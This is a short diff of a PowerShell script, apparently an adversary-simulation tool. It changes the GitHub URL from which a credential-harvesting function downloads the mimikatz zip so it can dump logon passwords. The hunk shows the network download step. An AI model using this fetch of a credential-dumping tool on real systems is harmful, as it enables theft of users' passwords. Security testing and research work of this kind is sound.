@@ -418,7 +418,7 @@ Function sub_Credentials_MimikatzLogonpasswords() {
     $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".zip")
     $Folder = [System.IO.Path]::GetDirectoryName($FileName)
     #$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip"
-    $url = "https://github.com/basti1-b/scripts/raw/master/mimikatz_trunk.zip"
+    $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200227/mimikatz_trunk.zip"
     
     Write-LogToConsole "Downloading mimikatz into [$FileName]"
     $wc = New-Object System.Net.WebClient
